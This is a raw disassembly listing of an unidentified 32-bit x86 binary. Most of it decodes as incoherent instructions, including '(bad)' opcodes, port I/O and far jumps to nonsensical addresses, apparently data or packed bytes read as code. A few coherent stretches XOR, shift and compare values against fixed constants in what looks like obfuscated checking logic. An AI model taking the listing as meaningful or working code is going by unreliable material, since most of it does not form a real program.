  405e19:	lea    esi,ds:0xdcdb237a
  405e1f:	repz push ebx
  405e21:	(bad)  
  405e22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e23:	cmp    eax,0xff2b80b4
  405e28:	xchg   ebp,eax
  405e29:	lea    ebx,gs:[edi]
  405e2c:	add    BYTE PTR [ecx],ah
  405e2e:	ins    BYTE PTR es:[edi],dx
  405e2f:	enter  0x692a,0xad
  405e33:	ffreep st(3)
  405e35:	call   0x6163:0xf4ba06c6
  405e3c:	repz mov bh,dh
  405e3f:	sbb    DWORD PTR [esi+0x36],ecx
  405e42:	mov    ah,0x5b
  405e44:	aad    0x7c
  405e46:	stc    
  405e47:	push   edi
  405e48:	xor    cl,0x8d
  405e4b:	mov    esi,0x6b2a37eb
  405e50:	dec    eax
  405e51:	inc    edx
  405e52:	inc    edx
  405e53:	mov    bl,0xc2
  405e55:	adc    al,0xec
  405e57:	or     DWORD PTR [ebx+0x2f537a4c],esp
  405e5d:	pop    ebx
  405e5e:	jnp    0x405e16
  405e60:	mov    ecx,DWORD PTR [esi+0x4]
  405e63:	mov    ecx,eax
  405e65:	shl    ecx,0x1e
  405e68:	xor    ecx,0x80000000
  405e6e:	mov    DWORD PTR [ebp-0x64],ecx
  405e71:	mov    ecx,DWORD PTR [esi]
  405e73:	mov    edx,DWORD PTR [esi+0x4]
  405e76:	jmp    0x406217
  405e7b:	pusha  
  405e7c:	adc    bh,BYTE PTR ds:0x60b2b35d
  405e82:	adc    al,0xa6
  405e84:	pop    es
  405e85:	fnstsw WORD PTR ds:[edi-0x4161e1e5]
  405e8c:	sub    eax,0xc4bdbebe
  405e91:	mov    esi,0x4aff10be
  405e96:	mov    edx,DWORD PTR [ecx]
  405e98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e99:	push   ecx
  405e9a:	repz gs repnz mov ebx,0x6ddd8e35
  405ea2:	mov    cl,0x14
  405ea4:	inc    ebx
  405ea5:	sbb    eax,0xa3aa70b2
  405eaa:	div    BYTE PTR [edx-0x73333f11]
  405eb0:	pop    ds
  405eb1:	scas   al,BYTE PTR es:[edi]
  405eb2:	push   ds
  405eb3:	daa    
  405eb4:	pop    ebp
  405eb5:	mov    gs,WORD PTR [ebx]
  405eb7:	push   esi
  405eb8:	int3   
  405eb9:	jecxz  0x405e92
  405ebb:	test   BYTE PTR [esi-0x2a2c26de],bh
  405ec1:	mov    ds:0xe0179aaa,al
  405ec6:	push   0x29
  405ec8:	mov    cl,0x2c
  405eca:	xchg   esp,eax
  405ecb:	xchg   edi,eax
  405ecc:	xchg   ebp,eax
  405ecd:	outs   dx,BYTE PTR ds:[esi]
  405ece:	add    ah,BYTE PTR [ebp+eiz*2+0x404f3fa8]
  405ed5:	(bad)  
  405ed6:	aad    0xc3
  405ed8:	cmp    eax,0x2761153c
  405edd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ede:	scas   eax,DWORD PTR es:[edi]
  405edf:	cld    
  405ee0:	sub    DWORD PTR [edi-0x7e],ebp
  405ee3:	and    DWORD PTR [edx+edx*8],esi
  405ee6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ee7:	std    
  405ee8:	inc    esp
  405ee9:	sbb    DWORD PTR [ebx-0x6005bae8],esi
  405eef:	mov    esp,0x70eef559
  405ef4:	loope  0x405eb2
  405ef6:	mov    ebp,0x8107d4f3
  405efb:	jg     0x405f29
  405efd:	mov    edx,0x625431b0
  405f02:	pusha  
  405f03:	mov    ?,WORD PTR [edi+edi*1]
  405f06:	inc    esi
  405f07:	pop    edx
  405f08:	into   
  405f09:	loop   0x405ecb
  405f0b:	push   ebp
  405f0c:	push   esi
  405f0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f0e:	je     0x405f7b
  405f10:	arpl   di,bp
  405f12:	fiadd  WORD PTR [edi]
  405f14:	mov    eax,ds:0x83bdf7
  405f19:	popa   
  405f1a:	mov    ebp,DWORD PTR [edx+esi*2-0x12]
  405f1e:	std    
  405f1f:	sbb    DWORD PTR [edi+edi*2],eax
  405f22:	mov    ds:0x1982c05b,eax
  405f27:	xor    dh,BYTE PTR [ecx]
  405f29:	dec    ecx
  405f2a:	sub    al,0x36
  405f2c:	repnz pop ebx
  405f2e:	dec    ebp
  405f2f:	and    DWORD PTR [ebx],ecx
  405f31:	mov    ch,0xa6
  405f33:	inc    ebx
  405f34:	loopne 0x405f28
  405f36:	mov    gs,WORD PTR [esp+ebx*8-0x2c]
  405f3a:	pop    ebx
  405f3b:	mov    ebp,0x972d211f
  405f40:	out    dx,al
  405f41:	and    BYTE PTR [ebx+0x30],0xd2
  405f45:	mov    dx,0x9643
  405f49:	adc    al,0xe0
  405f4b:	sub    DWORD PTR [edx-0x39a47780],ebx
  405f51:	sbb    DWORD PTR [ebp+esi*1-0x43],eax
  405f55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f56:	icebp  
  405f57:	daa    
  405f58:	pop    ecx
  405f59:	leave  
  405f5a:	mov    ch,0x66
  405f5c:	dec    ebp
  405f5d:	das    
  405f5e:	pushf  
  405f5f:	arpl   ax,di
  405f61:	cmp    bh,BYTE PTR [edx+eiz*8]
  405f64:	cmp    BYTE PTR ds:0x2f783272,0x8f
  405f6b:	int    0x16
  405f6d:	mov    edx,0xa945edc6
  405f72:	test   BYTE PTR [eax-0x20577c2f],bh
  405f78:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f7a:	or     bh,BYTE PTR [esi-0x7f4f59f5]
  405f80:	push   0x4d279ad8
  405f85:	lea    ebp,[eax+0x28874166]
  405f8b:	adc    al,0x1b
  405f8d:	adc    DWORD PTR ds:0x554ceb58,0x55
  405f94:	inc    edx
  405f95:	add    al,0x9d
  405f97:	(bad)  
  405f98:	mov    bh,0xfa
  405f9a:	call   0x9f2c7c25
  405f9f:	pop    es
  405fa0:	push   edx
  405fa1:	jo     0x405fc0
  405fa3:	xor    dl,bh
  405fa5:	test   eax,0x77b5488a
  405faa:	xor    al,0x5e
  405fac:	push   0xdd491e4b
  405fb1:	sub    eax,0xeada0f7a
  405fb6:	test   BYTE PTR [esi],cl
  405fb8:	jle    0x405fd5
  405fba:	cli    
  405fbb:	mov    ecx,ss
  405fbd:	mov    eax,ds:0xf7367e5d
  405fc2:	out    dx,eax
  405fc3:	adc    DWORD PTR [edx+ecx*4-0x417cb662],edx
  405fca:	div    DWORD PTR [ebx-0x38]
  405fcd:	ins    BYTE PTR es:[edi],dx
  405fce:	pop    ds
  405fcf:	mov    esi,0x758b207a
  405fd4:	retf   
  405fd5:	mov    al,ds:0x8d3a2b95
  405fda:	ret    0x324c
  405fdd:	and    cl,BYTE PTR [edx+0x1f8fcfbf]
  405fe3:	ins    BYTE PTR es:[edi],dx
  405fe4:	clc    
  405fe5:	sbb    eax,0x242ca5b1
  405fea:	dec    ebx
  405feb:	scas   eax,DWORD PTR es:[edi]
  405fec:	adc    al,0xea
  405fee:	cmp    cl,cl
  405ff0:	clc    
  405ff1:	jle    0x40603a
  405ff3:	push   0xffffffc0
  405ff5:	or     eax,0x392c483a
  405ffa:	jo     0x406018
  405ffc:	sbb    BYTE PTR [ecx],dl
  405ffe:	call   0x8653a6fb
  406003:	cmp    ebx,ebp
  406005:	mov    bl,0x1
  406007:	clc    
  406008:	mov    ecx,0xeb291261
  40600d:	add    BYTE PTR [edi],0x85
  406010:	adc    dh,BYTE PTR [ecx]
  406012:	out    0xe8,eax
  406014:	cmc    
  406015:	push   ss
  406016:	sub    DWORD PTR [esi],esp
  406018:	xor    eax,0x6a0a5714
  40601d:	push   edx
  40601e:	mov    eax,0xe889efd4
  406023:	xchg   esi,eax
  406024:	and    eax,0x91dba617
  406029:	cdq    
  40602a:	push   eax
  40602b:	add    DWORD PTR [esi-0x9c4e925],0xffffffca
  406032:	jmp    0x4060a9
  406034:	dec    ebp
  406035:	add    eax,0x6541c0cf
  40603a:	inc    edx
  40603b:	push   es
  40603c:	adc    al,0x3d
  40603e:	and    edx,DWORD PTR [esi-0x8]
  406041:	push   ds
  406042:	shl    BYTE PTR ds:0xa4313791,1
  406048:	gs retf 
  40604a:	and    DWORD PTR [edx+0x239d8b74],esp
  406050:	mov    DWORD PTR [edx],edx
  406052:	xchg   esi,eax
  406053:	ins    DWORD PTR es:[edi],dx
  406054:	sahf   
  406055:	cmp    BYTE PTR [ecx-0x3e],ch
  406058:	shr    edx,cl
  40605a:	test   eax,0x9147e0c9
  40605f:	dec    eax
  406060:	mov    ebp,0xc61bf95d
  406065:	dec    edx
  406066:	aas    
  406067:	mov    ebp,DWORD PTR [esi]
  406069:	retf   0x34f2
  40606c:	and    ebp,DWORD PTR ds:0x47dbb872
  406072:	in     al,dx
  406073:	adc    al,0xbd
  406075:	fmul   QWORD PTR [esp+eax*4]
  406078:	jbe    0x4060a1
  40607a:	xchg   ecx,eax
  40607b:	jle    0x40608d
  40607d:	sar    BYTE PTR [edi+0x5],1
  406080:	jg     0x406017
  406082:	ficomp WORD PTR [ecx-0x3f]
  406085:	aam    0x34
  406087:	or     BYTE PTR [ecx+esi*1+0x564e7e50],al
  40608e:	xchg   ebp,eax
  40608f:	push   esp
  406090:	neg    DWORD PTR [ecx+0x6d]
  406093:	mov    ebx,0x83746faa
  406098:	or     eax,0x50b2a82d
  40609d:	in     eax,dx
  40609e:	div    DWORD PTR [edi+0x57]
  4060a1:	push   ds
  4060a2:	in     al,dx
  4060a3:	push   ebx
  4060a4:	aam    0xfa
  4060a6:	in     eax,0xb9
  4060a8:	(bad)  
  4060a9:	xchg   esp,eax
  4060aa:	push   0xfffffff0
  4060ac:	push   0x42
  4060ae:	push   ss
  4060af:	out    0x60,al
  4060b1:	jb     0x4060c0
  4060b3:	imul   esi,DWORD PTR [ecx+0x6c0f466f],0xffffffba
  4060ba:	or     al,0xe3
  4060bc:	or     BYTE PTR [edi],al
  4060be:	addr16 and al,0x7f
  4060c1:	and    DWORD PTR [edx],ebx
  4060c3:	clc    
  4060c4:	ds cmp ebx,edx
  4060c7:	cmp    esp,DWORD PTR [esi+0xd38afe4]
  4060cd:	repnz data16 sbb al,BYTE PTR [edi-0x5cccff68]
  4060d5:	mov    ebx,0x29b544e6
  4060da:	or     bl,dl
  4060dc:	paddd  mm3,QWORD PTR [ebx-0x77ee5a7]
  4060e3:	push   0x5cd7ba76
  4060e8:	mov    cl,0xd6
  4060ea:	push   es
  4060eb:	nop
  4060ec:	adc    DWORD PTR [esp+ecx*2],eax
  4060ef:	mov    eax,ds:0x8e3205d4
  4060f4:	jne    0x406081
  4060f6:	pop    ds
  4060f7:	sbb    DWORD PTR [ecx+0x3c02b943],ebx
  4060fd:	imul   esp,DWORD PTR [ebp+0x3a706be8],0x8fa96468
  406107:	(bad)  
  406108:	lahf   
  406109:	mov    ss,WORD PTR [eax]
  40610b:	inc    esi
  40610c:	sbb    ch,BYTE PTR [eax+0x29b85f61]
  406112:	sub    ah,BYTE PTR [edi]
  406114:	cmp    BYTE PTR [ebx+0x57af1fd5],al
  40611a:	fsub   st,st(1)
  40611c:	jl     0x406178
  40611e:	test   eax,0xa1220161
  406123:	xchg   edx,eax
  406124:	in     al,dx
  406125:	jle    0x40616c
  406127:	(bad)  
  406128:	xlat   BYTE PTR ds:[ebx]
  406129:	stos   DWORD PTR es:[edi],eax
  40612a:	fdivrp st(1),st
  40612c:	bnd jle 0x4060b7
  40612f:	sbb    ah,BYTE PTR [edi+0x34]
  406132:	pop    ds
  406133:	mov    edx,0x73d03578
  406138:	outs   dx,DWORD PTR ds:[esi]
  406139:	mov    edx,0x47ab4869
  40613e:	add    DWORD PTR [edx-0x2a],0xffffffd8
  406142:	les    edx,FWORD PTR [eax]
  406144:	pop    ebp
  406145:	(bad)  
  406146:	or     BYTE PTR [edx+eax*4-0x43f1e4a3],ah
  40614d:	mov    esi,0xc992eaac
  406152:	fnstsw WORD PTR [ebp+esi*2-0x41]
  406156:	mov    ah,0xbe
  406158:	mov    ecx,?
  40615a:	cld    
  40615b:	popf   
  40615c:	jle    0x406121
  40615e:	test   al,0x4f
  406160:	pop    ds
  406161:	test   eax,0x4ffa0401
  406166:	pop    esi
  406167:	jne    0x40618d
  406169:	rcr    BYTE PTR [ecx-0x2d15426c],0xa
  406170:	in     eax,0x65
  406172:	call   0x3bff9bd7
  406177:	adc    bl,dl
  406179:	lahf   
  40617a:	pop    es
  40617b:	jl     0x40619b
  40617d:	sub    BYTE PTR [esi-0x33bbcd37],0x9d
  406184:	hlt    
  406185:	push   0xbc9bd5d5
  40618a:	push   0xffffffbf
  40618c:	fcomp  st(3)
  40618e:	inc    ebp
  40618f:	in     eax,0xfb
  406191:	ret    0x600
  406194:	cwde   
  406195:	mov    ecx,0x3be8734c
  40619a:	mov    ecx,0x78124a97
  40619f:	xchg   edi,eax
  4061a0:	add    DWORD PTR [ecx],edx
  4061a2:	push   esi
  4061a3:	pop    edi
  4061a4:	rcr    edi,cl
  4061a6:	retf   0x54c4
  4061a9:	push   0x9cc1edc2
  4061ae:	inc    edx
  4061af:	imul   ebp,esi,0xffffffd2
  4061b2:	push   ds
  4061b3:	jae    0x4061fe
  4061b5:	sahf   
  4061b6:	addr16 push ss
  4061b8:	jbe    0x406196
  4061ba:	lods   eax,DWORD PTR ds:[esi]
  4061bb:	mov    cl,0xff
  4061bd:	call   0x9323:0x17657b26
  4061c4:	sar    bl,cl
  4061c6:	rcr    DWORD PTR [edi],cl
  4061c8:	sti    
  4061c9:	into   
  4061ca:	das    
  4061cb:	fcomp  DWORD PTR [esi+0x62]
  4061ce:	aad    0xb4
  4061d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061d1:	fld    QWORD PTR [edx+0x31c6bf68]
  4061d7:	and    ah,BYTE PTR [ebp+0x6f90f16c]
  4061dd:	mov    esi,0xceb19ede
  4061e2:	fs push 0x78
  4061e5:	add    BYTE PTR [edi-0x74e85899],bh
  4061eb:	add    DWORD PTR [eax+0x4b],ebx
  4061ee:	pop    edx
  4061ef:	jno    0x4061e1
  4061f1:	and    al,dl
  4061f3:	frstor [edx-0x4d33fb31]
  4061f9:	push   eax
  4061fa:	mov    ds:0x1b141b35,eax
  4061ff:	icebp  
  406200:	mov    ebx,0xd6fd8c81
  406205:	outs   dx,BYTE PTR ds:[esi]
  406206:	ror    BYTE PTR [edi*8-0x71bdfe27],0x8a
  40620e:	in     al,dx
  40620f:	jecxz  0x406221
  406211:	or     eax,0x3c27a81c
  406216:	les    eax,FWORD PTR [ecx+0x2b8ae8f2]
  40621c:	pushf  
  40621d:	xor    ecx,0xcb79b577
  406223:	shrd   ecx,edx,0x2
  406227:	shr    edx,0x2
  40622a:	or     edx,DWORD PTR [ebp-0x64]
  40622d:	xor    eax,eax
  40622f:	or     ecx,eax
  406231:	mov    eax,DWORD PTR [ebx]
  406233:	mov    DWORD PTR [ebp-0x2c],edx
  406236:	mov    edx,DWORD PTR [ebx+0x4]
  406239:	mov    edx,eax
  40623b:	xor    eax,eax
  40623d:	shl    edx,0x1e
  406240:	xor    edx,0x80000000
  406246:	mov    DWORD PTR [ebp-0x70],eax
  406249:	mov    eax,DWORD PTR [ebx]
  40624b:	mov    DWORD PTR [ebp-0x6c],edx
  40624e:	mov    edx,DWORD PTR [ebx+0x4]
  406251:	xor    eax,0xcb79b577
  406256:	xor    edx,0x9c2b8ae8
  40625c:	shrd   eax,edx,0x2
  406260:	or     eax,DWORD PTR [ebp-0x70]
  406263:	shr    edx,0x2
  406266:	mov    DWORD PTR [ebp-0x38],eax
  406269:	mov    eax,edx
  40626b:	or     eax,DWORD PTR [ebp-0x6c]
  40626e:	mov    DWORD PTR [ebp-0x5c],edx
  406271:	cmp    ecx,DWORD PTR [ebp-0x38]
  406274:	jne    0x405a82
  40627a:	cmp    DWORD PTR [ebp-0x2c],eax
  40627d:	je     0x408bb3
  406283:	jmp    0x405a82
  406288:	mov    eax,DWORD PTR [esi]
  40628a:	mov    ecx,DWORD PTR [esi+0x4]
  40628d:	mov    ecx,eax
  40628f:	shl    ecx,0x1e
  406292:	xor    ecx,0x80000000
  406298:	mov    DWORD PTR [ebp+0x14],ecx
  40629b:	mov    ecx,DWORD PTR [esi]
  40629d:	mov    edx,DWORD PTR [esi+0x4]
  4062a0:	xor    ecx,0xcb79b577
  4062a6:	xor    edx,0x9c2b8ae8
  4062ac:	shrd   ecx,edx,0x2
  4062b0:	xor    eax,eax
  4062b2:	or     ecx,eax
  4062b4:	mov    eax,DWORD PTR [ebx]
  4062b6:	mov    DWORD PTR [ebp-0x68],ecx
  4062b9:	mov    ecx,DWORD PTR [ebx+0x4]
  4062bc:	mov    ecx,eax
  4062be:	xor    eax,eax
  4062c0:	shr    edx,0x2
  4062c3:	or     edx,DWORD PTR [ebp+0x14]
  4062c6:	mov    DWORD PTR [ebp+0x10],eax
  4062c9:	mov    eax,DWORD PTR [ebx]
  4062cb:	shl    ecx,0x1e
  4062ce:	xor    ecx,0x80000000
  4062d4:	mov    DWORD PTR [ebp-0x64],edx
  4062d7:	jmp    0x406678
  4062dc:	aas    
  4062dd:	jne    0x40629e
  4062df:	arpl   ax,di
  4062e1:	jl     0x406347
  4062e3:	jns    0x40632d
  4062e5:	das    
  4062e6:	inc    esi
  4062e7:	xchg   edx,eax
  4062e8:	call   0xbdde8573
  4062ed:	xor    edi,DWORD PTR [esi-0x413b4242]
  4062f3:	mov    esi,0x8b58dcb0
  4062f8:	or     edi,DWORD PTR [edi+0x34]
  4062fb:	pop    ds
  4062fc:	outs   dx,BYTE PTR ds:[esi]
  4062fd:	cmp    al,0x1a
  4062ff:	push   ebp
  406300:	mov    eax,0x178e7a5e
  406305:	jo     0x40636c
  406307:	loop   0x406296
  406309:	outs   dx,DWORD PTR ds:[esi]
  40630a:	aas    
  40630b:	fld    st(5)
  40630d:	jmp    0x4062a4
  40630f:	cmp    eax,0xa0fd125b
  406314:	(bad)  
  406315:	jmp    0xdd320ec7
  40631a:	mov    dl,0xb1
  40631c:	stos   DWORD PTR es:[edi],eax
  40631d:	and    ah,BYTE PTR [edx+0x6568dd52]
  406323:	mov    ah,0x8c
  406325:	jno    0x406354
  406327:	repz rcr eax,0xd7
  40632b:	jmp    0x406366
  40632d:	lahf   
  40632e:	push   ds
  40632f:	lods   al,BYTE PTR ds:[esi]
  406330:	addr16 mov al,ds:0xf08f
  406334:	adc    DWORD PTR [eax],0x5e
  406337:	les    ebx,FWORD PTR [esp+esi*4-0x148895ab]
  40633e:	mov    BYTE PTR [eax-0xb],cl
  406341:	cld    
  406342:	pop    eax
  406343:	jg     0x40632f
  406345:	xchg   edi,edi
  406347:	aam    0xf
  406349:	sub    DWORD PTR [eax+0x4aca3a72],0x16b44c93
  406353:	stc    
  406354:	cwde   
  406355:	mov    es,WORD PTR [esi+0x14]
  406358:	push   ss
  406359:	pop    ebx
  40635a:	and    al,0x92
  40635c:	jl     0x406307
  40635e:	cmp    edx,DWORD PTR [ecx-0xd]
  406361:	and    ebp,ebx
  406363:	mov    ah,0x4b
  406365:	adc    BYTE PTR [esi-0x21a5b55d],ch
  40636b:	cmp    BYTE PTR [ecx+edx*2+0x12f28ae3],0x42
  406373:	mov    ecx,0x3c0559c8
  406378:	shl    BYTE PTR [ebx],1
  40637a:	mov    ah,0x22
  40637c:	sbb    BYTE PTR [ebx+0x684ad198],dh
  406382:	cmp    al,0xb4
  406384:	xor    DWORD PTR [edi],0x59
  406387:	int3   
  406388:	push   eax
  406389:	lock or al,0x5e
  40638c:	sub    BYTE PTR [ecx+eax*8+0x1185a9a9],0x2b
  406394:	pop    ebx
  406395:	adc    edx,esi
  406397:	jbe    0x40640b
  406399:	sbb    bl,BYTE PTR [eax-0x62aa58cb]
  40639f:	ror    BYTE PTR [esi+0x1b25c15f],1
  4063a5:	xchg   esi,eax
  4063a6:	sub    al,cl
  4063a8:	dec    ebx
  4063a9:	fistp  DWORD PTR [eax]
  4063ab:	add    al,0x50
  4063ad:	sbb    dl,BYTE PTR fs:[ebx]
  4063b0:	out    0x3d,al
  4063b2:	gs cld 
  4063b4:	ja     0x40637a
  4063b6:	lods   eax,DWORD PTR ds:[esi]
  4063b7:	xchg   esi,eax
  4063b8:	adc    BYTE PTR [edi+edi*8],cl
  4063bb:	pop    edx
  4063bc:	cmp    ebx,DWORD PTR [ebx]
  4063be:	mov    esi,0x263f1164
  4063c3:	pop    esp
  4063c4:	in     al,0xdf
  4063c6:	les    edi,FWORD PTR gs:[esi]
  4063c9:	xchg   esp,eax
  4063ca:	jmp    0x6527:0xb81e2e12
  4063d1:	inc    ebp
  4063d2:	(bad)  
  4063d3:	cmp    eax,0x7114923
  4063d8:	add    eax,0xb216eced
  4063dd:	push   cs
  4063de:	dec    esi
  4063df:	stos   DWORD PTR es:[edi],eax
  4063e0:	lahf   
  4063e1:	lds    ebx,FWORD PTR [edx]
  4063e3:	pusha  
  4063e4:	imul   eax,DWORD PTR [ecx+ebx*1-0x18],0x4e
  4063e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063ea:	stos   DWORD PTR es:[edi],eax
  4063eb:	popa   
  4063ec:	js     0x406464
  4063ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063ef:	sub    BYTE PTR [esi-0x59],bh
  4063f2:	int3   
  4063f3:	xchg   ecx,eax
  4063f4:	cli    
  4063f5:	bound  eax,QWORD PTR [ebx]
  4063f7:	mov    esi,0x9354e09d
  4063fc:	pop    edx
  4063fd:	adc    ch,cl
  4063ff:	pushf  
  406400:	and    BYTE PTR [esi+0x78d2b169],ch
  406406:	lock adc al,0x18
  406409:	es xor al,0xd4
  40640c:	mov    bh,0x67
  40640e:	bound  edx,QWORD PTR [ebx]
  406410:	sub    cl,BYTE PTR [edi]
  406412:	pop    ecx
  406414:	cmp    al,0x81
  406416:	aad    0x90
  406418:	xor    eax,0x26565f98
  40641d:	inc    eax
  40641e:	int3   
  40641f:	inc    esi
  406420:	iret   
  406421:	xlat   BYTE PTR ds:[ebx]
  406422:	add    DWORD PTR [edx],0xc7e09feb
  406428:	cmp    ebx,ecx
  40642a:	aas    
  40642b:	xchg   esp,eax
  40642c:	inc    edx
  40642d:	call   0x8bad:0x7923ab81
  406434:	fisttp QWORD PTR ds:0xdb16435
  40643a:	pushf  
  40643b:	mov    bl,0xfd
  40643d:	arpl   cx,sp
  40643f:	popf   
  406440:	jae    0x4063ed
  406442:	iret   
  406443:	aaa    
  406444:	jle    0x4064ae
  406446:	lock repnz stos DWORD PTR es:[edi],eax
  406449:	sub    edi,eax
  40644b:	xor    DWORD PTR [ebx],edx
  40644d:	lds    esp,FWORD PTR [ebx-0x6]
  406450:	gs sub al,0x5b
  406453:	outs   dx,DWORD PTR ds:[esi]
  406454:	cmc    
  406455:	sbb    DWORD PTR [esi+0x61],edi
  406458:	mov    ebx,0xb13557ee
  40645d:	and    eax,0x5ae345f2
  406462:	ins    DWORD PTR es:[edi],dx
  406463:	outs   dx,BYTE PTR ds:[esi]
  406464:	sbb    al,0x38
  406466:	jns    0x40649d
  406468:	pop    ebx
  406469:	sub    al,0x2b
  40646b:	jg     0x4064c5
  40646d:	push   esp
  40646e:	lahf   
  40646f:	clc    
  406470:	gs cwde 
  406472:	xlat   BYTE PTR ds:[ebx]
  406473:	jecxz  0x406471
  406475:	and    BYTE PTR [ebx],0x6f
  406478:	mov    esi,0x60de04ae
  40647d:	push   ebp
  40647e:	sub    bh,BYTE PTR [esi]
  406480:	(bad)  
  406481:	pop    esi
  406482:	jo     0x406496
  406484:	sub    DWORD PTR [edx+0x7b],edi
  406487:	(bad)  
  406489:	call   0xdf48:0xde160c07
  406490:	dec    ebx
  406491:	leave  
  406492:	and    DWORD PTR [ebp+0x5d503b44],0x2a83b316
  40649c:	ror    DWORD PTR [edi+0x78581f65],0x30
  4064a3:	test   al,0x8c
  4064a5:	les    ecx,FWORD PTR [ecx+ecx*2-0x4a9d20b8]
  4064ac:	(bad)  
  4064ad:	shr    BYTE PTR [esi+0x2fdc751d],0xfb
  4064b4:	xchg   BYTE PTR [ebp+0x1948c1d5],ah
  4064ba:	xchg   ebp,eax
  4064bb:	mov    esp,DWORD PTR [edi]
  4064bd:	fild   WORD PTR [edx]
  4064bf:	mov    edx,0x5b786957
  4064c4:	ret    0x7163
  4064c7:	outs   dx,BYTE PTR ds:[esi]
  4064c8:	mov    eax,0xf215b4a3
  4064cd:	push   edi
  4064ce:	cmp    al,0x8e
  4064d0:	inc    esi
  4064d1:	sub    BYTE PTR [edi+0x16],0xfc
  4064d5:	xor    ebp,esi
  4064d7:	ss push eax
  4064d9:	stc    
  4064da:	out    0xa2,eax
  4064dc:	jbe    0x4064c4
  4064de:	push   DWORD PTR [edi]
  4064e0:	inc    esi
  4064e1:	pop    ds
  4064e2:	push   0xffffff81
  4064e4:	or     eax,0xbc09e870
  4064e9:	call   0x200b:0xb879d0d
  4064f0:	mov    ebp,db0
  4064f3:	jmp    0x3a1d:0xcc331548
  4064fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064fb:	inc    ebp
  4064fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064fd:	inc    ecx
  4064fe:	lock fimul DWORD PTR [ecx-0x6331dc88]
  406505:	data16 jnp 0x406546
  406508:	pushf  
  406509:	xchg   esp,eax
  40650a:	add    eax,0x974bc002
  40650f:	mov    ah,0x4
  406511:	add    al,ah
  406513:	jl     0x406563
  406515:	hlt    
  406516:	sar    BYTE PTR [ebp-0x34e63bd5],0xe2
  40651d:	or     eax,0x3e089f49
  406522:	push   ebp
  406523:	fldcw  WORD PTR [ecx]
  406525:	mov    eax,ds:0x51d39ea5
  40652a:	sub    eax,0x99b29075
  40652f:	mov    ebx,0xae6eafdb
  406534:	xchg   ecx,eax
  406535:	inc    ebp
  406536:	cld    
  406537:	inc    eax
  406538:	imul   edx,DWORD PTR [edx+0x5cca2d26],0xb5491a9
  406542:	out    dx,al
  406543:	pop    ss
  406544:	cld    
  406545:	fist   WORD PTR [eax-0x22]
  406548:	js     0x40659c
  40654a:	popf   
  40654b:	ror    BYTE PTR [esi],0xa2
  40654e:	ja     0x406568
  406550:	enter  0x3a93,0x2
  406554:	mov    BYTE PTR [ecx-0x6f28bb9a],0xa9
  40655b:	ja     0x406595
  40655d:	fs sbb eax,0xc1581578
  406563:	sub    ebp,DWORD PTR [ecx-0x34]
  406566:	or     DWORD PTR [ebp+edx*8-0x365b366],edx
  40656d:	mov    ecx,0xbb592232
  406572:	pop    es
  406573:	(bad)  
  406574:	adc    bh,BYTE PTR [edx-0x3031a783]
  40657a:	sbb    BYTE PTR [ebp+0x7de4a3e6],bl
  406580:	imul   ebp,DWORD PTR [edi],0x7
  406583:	pop    esp
  406584:	(bad)  
  406586:	pop    ds
  406587:	loopne 0x4065b3
  406589:	out    0x83,al
  40658b:	add    DWORD PTR [ecx+eiz*2],edx
  40658e:	add    BYTE PTR [ecx],cl
  406590:	push   ebp
  406591:	(bad)  
  406592:	repnz out dx,eax
  406594:	jb     0x406534
  406596:	mov    al,0x52
  406598:	jb     0x406595
  40659a:	and    al,BYTE PTR [ebp-0x62af269]
  4065a0:	mov    DWORD PTR [ebx+0x56c4d0d6],0xd450fe29
  4065aa:	xor    eax,0x8e53f295
  4065af:	fwait
  4065b0:	cmp    ebp,DWORD PTR [ebx+0x56]
  4065b3:	lods   al,BYTE PTR ds:[esi]
  4065b4:	sub    ecx,eax
  4065b6:	pop    ds
  4065b7:	clc    
  4065b8:	xor    DWORD PTR [edi+0x67],esi
  4065bb:	pop    ds
  4065bc:	mov    bh,0x9
  4065be:	and    ah,0xfd
  4065c1:	retf   0x8e4d
  4065c4:	adc    DWORD PTR [edi+0x71],0x9ea2caaf
  4065cb:	clc    
  4065cc:	and    ah,BYTE PTR [edx]
  4065ce:	shr    dh,cl
  4065d0:	mov    eax,0x2181e4ba
  4065d5:	cwde   
  4065d6:	xchg   edx,eax
  4065d7:	sub    eax,0x8999f639
  4065dc:	xor    al,0xd7
  4065de:	pop    ecx
  4065df:	and    eax,0xa171fcfa
  4065e4:	adc    DWORD PTR [ebx],ecx
  4065e6:	popa   
  4065e7:	jge    0x4065a3
  4065e9:	xchg   edi,eax
  4065ea:	fcom   DWORD PTR [eax+0x7afa6c93]
  4065f0:	adc    al,0xd8
  4065f2:	int    0xbe
  4065f4:	test   DWORD PTR [edi],ecx
  4065f6:	jo     0x40661d
  4065f8:	xor    esi,ecx
  4065fa:	push   eax
  4065fb:	out    0xd4,eax
  4065fd:	mov    esi,0xa353703
  406602:	(bad)  
  406603:	push   ebp
  406604:	fadd   DWORD PTR [edx-0x4]
  406607:	or     al,0xe1
  406609:	mov    esi,0xfb97e3b7
  40660e:	leave  
  40660f:	lahf   
  406610:	paddd  mm1,QWORD PTR [eax]
  406613:	lahf   
  406614:	jle    0x406691
  406616:	jno    0x4065e2
  406618:	xor    eax,0x83a7e262
  40661d:	sahf   
  40661e:	cld    
  40661f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406620:	mov    eax,0x4bd0ba1
  406625:	icebp  
  406626:	jo     0x4065b3
  406628:	xor    edi,0x1d0e4033
  40662e:	and    al,0x33
  406630:	into   
  406631:	leave  
  406632:	push   ebp
  406633:	mov    WORD PTR [edi],ss
  406635:	mov    edx,0xfa69c416
  40663a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40663b:	pop    ds
  40663c:	repz (bad) [ebx-0x32b0f6ab]
  406643:	ins    DWORD PTR es:[edi],dx
  406644:	jmp    0xfe69:0x57c2a246
  40664b:	sbb    edx,ebx
  40664d:	fs mov dl,0xc4
